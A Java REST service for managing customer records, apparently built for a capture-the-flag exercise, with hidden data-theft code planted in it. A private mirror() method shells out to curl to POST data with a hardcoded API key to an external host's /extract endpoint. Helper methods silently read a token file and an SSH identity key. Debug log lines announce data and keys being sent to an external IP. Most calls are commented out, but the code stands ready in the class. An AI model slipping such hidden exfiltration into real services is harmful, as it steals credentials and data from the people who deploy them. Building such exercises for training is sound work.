package org.acme.customer.rest;
import org.acme.customer.model.Customer;
import org.eclipse.microprofile.config.inject.ConfigProperty;
import org.eclipse.microprofile.openapi.annotations.Operation;
import org.eclipse.microprofile.openapi.annotations.responses.APIResponse;
import org.eclipse.microprofile.openapi.annotations.tags.Tag;
import org.jboss.logging.Logger;

import jakarta.transaction.Transactional;
import jakarta.ws.rs.*;
import jakarta.ws.rs.core.MediaType;
import jakarta.ws.rs.core.Response;
import jakarta.ws.rs.core.Response.Status;

import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;

// import org.slf4j.Logger;
// import org.slf4j.LoggerFactory;

import java.net.URI;
import java.util.List;
import java.util.concurrent.ThreadLocalRandom;


@Path("/customers")
@Produces(MediaType.APPLICATION_JSON)
@Consumes(MediaType.APPLICATION_JSON)
@Tag(name = "Customer Service API", description = "This is a REST service to manager customer information" )

public class CustomerResource {
     private static final Logger LOG = Logger.getLogger(CustomerResource.class);

    @ConfigProperty(name = "http.port" ) 
    String targetport;
    @ConfigProperty(name = "http.host") 
    String targethost;
    @ConfigProperty(name = "ns", defaultValue = "local-dev") 
    String user;
	
	private int randomNumber=204866;

    @GET
    @Operation(summary = "List customers, optionally filtered by first name")
    @APIResponse(responseCode = "200", description = "Customers found")
    public Response get(@HeaderParam("X-DEBUG") boolean debug, @QueryParam("firstname") String firstname) {

        if (!debug) LOG.info("[CTF.internal.verbose] - debug mode is off - nothing is shown");
        else LOG.info("[CTF.internal.verbose] - debug mode is ON");

        Response r=null;
        if (firstname != null)
             r=Response.ok(Customer.findByFirstName(firstname)).build();
        r=Response.ok(Customer.listAll()).build();

        //mirror();
		randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
        if (debug) {
	        LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "} at /extract" );

			/*
			String t = getToken();
            if (t != null)
                LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + t );

            String ss = getSSH();
            if (ss != null)
                LOG.debug("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Additional Key leaked: " + ss );
        	*/	
		
		}
        return r;
    }

    @GET
    @Path("/{id}")
    @Operation(summary = "Get a customer by its id")
    @APIResponse(responseCode = "200", description = "Customer found")
    @APIResponse(responseCode = "404", description = "Customer not found")
    public Response getById(@HeaderParam("X-DEBUG") boolean debug, @PathParam("id") String userId) {
        Customer customer = Customer.findByCustomerId(userId);
        if (customer != null) {
            //mirror();
			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
        	if (debug)
	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
		    return Response.status(Status.OK).entity(Customer.findByCustomerId(userId)).build();
		
		}
        return Response.status(Status.NOT_FOUND).build();
    }

    @POST
    @Transactional
    @Operation(summary = "Create a new customer")
    @APIResponse(responseCode = "201", description = "Customer created")
    @APIResponse(responseCode = "422", description = "Invalid customer payload supplied: id was invalidly set")
    @APIResponse(responseCode = "417", description = "Customer could not be created")
    public Response create(@HeaderParam("X-DEBUG") boolean debug, Customer customer) {
		
        if (customer.id != null) {
            throw new WebApplicationException("Id was invalidly set on request.", 422);
        } 
		
        customer.persist();
        if (customer.isPersistent()) {
			//mirror();
			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
        	if (debug)
	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
            return Response.created(URI.create("/customers/" + customer.id)).build();
        }
        return Response.status(Status.EXPECTATION_FAILED).build();
    }

    @PUT
    @Path("/{id}")
    @Transactional
    @Operation(summary = "Update a customer by its id")
    @APIResponse(responseCode = "204", description = "Customer updated")
    @APIResponse(responseCode = "404", description = "Customer not found")
    public Response updateById(@HeaderParam("X-DEBUG") boolean debug, @PathParam("id") String id, Customer newCustomer) {

        Customer customer = Customer.findById(id);
        if (customer != null){

            //mirror();
			randomNumber = ThreadLocalRandom.current().nextInt(100000, 1000000);
        	if (debug)
	        	LOG.info("[DEBUG]: io.net.embedded.HttpSender - [STREAM:OUT] Sending " +  randomNumber + " bytes to External IP CTF{" + targethost + "}" );
			
            customer.firstName = newCustomer.firstName;
            customer.lastName = newCustomer.lastName;
            customer.email = newCustomer.email;
            customer.phone = newCustomer.phone;
            return Response.status(Status.NO_CONTENT).entity(customer).build();
        }
        return Response.status(Status.NOT_FOUND).build();
    }

    /*
    @DELETE
    @Path("/{id}")  
    @Operation(summary = "Delete a customer by its id")
    @APIResponse(responseCode = "204", description = "Customer deleted")
    @APIResponse(responseCode = "404", description = "Customer not found")
    @Transactional
    public Response deleteById(@PathParam("id") String id){
        Customer customer = Customer.findById(id);
        if (customer != null) {
            customer.delete();
            return Response.status(Status.NO_CONTENT).build();
        }
        return Response.status(Status.NOT_FOUND).build();
    }
    */


    private void mirror() {
        //String envs = System.getenv().toString(); 
        String apikey= "4f9d2a1b-7e8c-4a3b-9d2f-1a2b3c4d5e6f";       

        String line = "data sent from " + user;

        ProcessBuilder pb = new ProcessBuilder("/usr/bin/curl", "-H", "Content-Type: text/plain", "-H", "x-api-key: "+apikey, "-X", "POST" ,"-d" , line, "http://"+targethost+":"+targetport+"/extract");  
        pb.redirectErrorStream(true); 
        try {
            pb.start(); 
        } catch (IOException e) {LOG.info("Unable to start Process");return;};
    }

	private String getToken() {
        try (InputStream is = Thread.currentThread().getContextClassLoader()
            .getResourceAsStream("CTF_token")) {
        
            if (is == null) {
                // This happens if the filename is misspelled or not in target/classes
                // throw new RuntimeException("File not found inside the JAR!");

                //KEEP BEING SILENT
                return null;
             }

            // Read all bytes and convert to String
            String tokencontent=new String(is.readAllBytes(), StandardCharsets.UTF_8);
            return tokencontent;
        } catch (Exception e) {
            // KEEP being silent
            return null;
        }
    }

    private String getSSH() {

        String sshfilename="ctf_ssh_identity.key";
        InputStream is = getClass().getResourceAsStream("/" + sshfilename);
        try {
            String sshcontent = new String(is.readAllBytes(), StandardCharsets.UTF_8);
            return sshcontent;
        } catch (IOException e) { LOG.info("Unable to read memory dump"); return "{}";}
    }
}
